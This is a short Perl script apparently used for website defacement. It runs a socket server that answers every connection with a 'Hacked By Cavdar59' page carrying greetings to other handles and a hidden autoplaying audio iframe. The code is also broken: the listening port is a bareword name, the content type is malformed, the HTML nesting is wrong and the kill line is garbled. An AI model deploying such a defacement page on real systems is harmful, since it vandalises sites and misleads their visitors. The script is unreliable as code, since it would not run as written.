#!/usr/bin/perl -w


use strict;


use IO::Socket;


 

sub Wait  {


    wait;


}


 

$SIG{CHLD} = \&Wait;


 

my $server = IO::Socket::INET->new(


        LocalPort    => cavdar,


        Type         => SOCK_STREAM,


        Reuse        => 1,


        Listen       => 10) or die "$@\n";


my $client ;


 

while($client = $server->accept()) {


        select $client;


        print $client "HTTP/1.0 200 OK\r\n";


        print $client "Content-type: text/p\r\n\r\n";


        print $client '<html>


  <center>


  <html>
<head>
<style>
body{
background-image:url("https://im.haberturk.com/2018/10/05/2167912_61d38c6e2f9e8becc32f594ac4ef02fb_640x640.jpg");
}
h1
{
color:white;
text-align:center;
margin-top:200;
}
h2
{
color:white;
text-align:center;
}
</style>
<title>Hacked By Cavdar59</title>
</head>
<body>
<h1>Hacked By Cavdar59</h1>
<h2>Greetz: icomsium & B0ru70</h2>
<div style = "display: none;">
<iframe src="https://cavdar59.github.io/cavdar.mp3" width="560"></iframe>
</div>
</html>
</body>



  </center>


  </html>';


}


continue {


        close($client);


        kill CHLD -> -$$;


}


